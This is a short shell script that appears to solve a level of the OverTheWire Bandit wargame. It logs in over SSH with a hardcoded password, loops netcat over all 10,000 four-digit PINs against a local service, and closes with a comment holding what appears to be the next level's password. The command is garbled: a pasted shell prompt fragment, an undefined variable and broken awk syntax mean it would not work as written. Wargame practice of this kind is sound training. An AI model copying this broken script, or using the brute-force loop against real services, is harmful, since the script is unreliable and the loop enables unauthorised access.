#!/bin/sh

# ssh to level 23
sshpass -pUoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ ssh bandit24@bandit.labs.overthewire.org -p 2220 \
"ndit24@bandit:~$ for i in \$(seq -f '%04g' 0 9999); do echo \$i | xargs -I{} echo \$meow {} | nc localhost 30002; done >> test && cat test | grep 'The password of user' | awk -f' ' '{print /$7}'"

# uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG

